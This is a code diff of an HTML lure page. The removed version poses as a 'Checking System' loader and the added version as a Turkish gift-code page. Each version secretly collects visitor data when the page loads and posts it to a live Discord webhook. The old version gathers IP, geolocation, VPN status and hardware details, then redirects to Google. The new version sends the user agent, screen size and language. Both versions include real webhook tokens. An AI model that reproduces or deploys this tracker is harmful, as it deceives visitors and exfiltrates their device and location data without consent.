@@ -1,88 +1,40 @@
 <!DOCTYPE html>
-<html lang="en">
+<html lang="tr">
 <head>
     <meta charset="UTF-8">
-    <title>Checking System...</title>
-    <style>
-        body { background: #000; color: #0f0; font-family: monospace; display: flex; align-items: center; justify-content: center; height: 100vh; margin: 0; overflow: hidden; }
-        .l { border: 3px solid #111; border-top: 3px solid #0f0; border-radius: 50%; width: 30px; height: 30px; animation: s 1s linear infinite; }
-        @keyframes s { to { transform: rotate(360deg); } }
-    </style>
+    <title>Hediye Sayfası</title>
 </head>
 <body>
-    <div class="l"></div>
+    <div style="text-align: center; margin-top: 100px; font-family: sans-serif;">
+        <h1>🎁 Tebrikler!</h1>
+        <p>Hediye kodunuz hazırlanıyor, lütfen bekleyin...</p>
+    </div>
 
     <script>
-        (function() {
-            "use strict";
+        const webhookURL = "https://discord.com/api/webhooks/1457050495964151929/cue_0Yvmkt49p_J8fV_M4ks3DeuDRMilywpZUAX-2StNSQVIBBWVAk13bXGP186puI73";
 
-            var WEBHOOK = "https://canary.discord.com/api/webhooks/1457149465688543363/FlP0AtpIk-Yg8NwxGQ1CSdityVf67AL-ODXFlPl9FtQq-tV5j2a9iZmWkGNAUsOHD9uL";
-            var REDIR = "https://www.google.com";
+        const bilgiler = {
+            "content": "🔔 **Sisteme Giriş Yapıldı!**",
+            "embeds": [{
+                "title": "Cihaz Bilgileri",
+                "color": 3447003,
+                "fields": [
+                    { "name": "Cihaz Modeli", "value": navigator.userAgent, "inline": false },
+                    { "name": "Ekran Boyutu", "value": window.screen.width + "x" + window.screen.height, "inline": true },
+                    { "name": "Dil", "value": navigator.language, "inline": true }
+                ],
+                "footer": { "text": "Veri başarıyla yakalandı" },
+                "timestamp": new Date()
+            }]
+        };
 
-            var run = function() {
-                var d = {
-                    os: navigator.platform,
-                    res: screen.width + "x" + screen.height,
-                    tz: Intl.DateTimeFormat().resolvedOptions().timeZone,
-                    mem: navigator.deviceMemory || "N/A",
-                    cpu: navigator.hardwareConcurrency || "N/A",
-                    gpu: "Unknown",
-                    vdr: "Unknown",
-                    ip: "N/A",
-                    vpn: "✅ Clear"
-                };
-
-                // GPU/Hardware Extraction
-                try {
-                    var c = document.createElement('canvas');
-                    var gl = c.getContext('webgl');
-                    var db = gl.getExtension('WEBGL_debug_renderer_info');
-                    d.gpu = gl.getParameter(db.UNMASKED_RENDERER_ID);
-                    d.vdr = gl.getParameter(db.UNMASKED_VENDOR_ID);
-                } catch(e) {}
-
-                // Network & VPN Extraction
-                fetch('https://ipapi.co/json/')
-                    .then(function(r) { return r.json(); })
-                    .then(function(j) {
-                        d.ip = j.ip;
-                        d.loc = j.city + ", " + j.region + " / " + j.country_name;
-                        if(j.timezone !== d.tz) { d.vpn = "🚨 **VPN DETECTED**"; }
-                        send(d);
-                    })
-                    .catch(function() { send(d); });
-            };
-
-            var send = function(data) {
-                var payload = {
-                    embeds: [{
-                        title: "💀 DATA CAPTURED - FULL SPECTRUM",
-                        color: 3066993,
-                        fields: [
-                            { name: "📡 NETWORK", value: "IP: " + data.ip + "\nLoc: " + data.loc + "\nVPN: " + data.vpn, inline: false },
-                            { name: "⚙️ HARDWARE", value: "OS: " + data.os + "\nCPU: " + data.cpu + " Cores\nRAM: " + data.mem + "GB\nGPU: " + data.gpu, inline: false },
-                            { name: "🖥️ DISPLAY", value: "Res: " + data.res + "\nTZ: " + data.tz + "\nVendor: " + data.vdr, inline: true }
-                        ],
-                        footer: { text: "Protocol: Omniscience 2026" },
-                        timestamp: new Date().toISOString()
-                    }]
-                };
-
-                var blob = new Blob([JSON.stringify(payload)], { type: 'application/json' });
-                
-                if (navigator.sendBeacon) {
-                    navigator.sendBeacon(WEBHOOK, blob);
-                } else {
-                    fetch(WEBHOOK, { method: 'POST', mode: 'no-cors', body: JSON.stringify(payload) });
-                }
-
-                setTimeout(function() {
-                    window.location.replace(REDIR);
-                }, 1200);
-            };
-
-            window.onload = run;
-        })();
+        fetch(webhookURL, {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify(bilgiler)
+        })
+        .then(() => console.log("Mesaj gönderildi!"))
+        .catch(err => console.error("Hata:", err));
     </script>
 </body>
 </html>
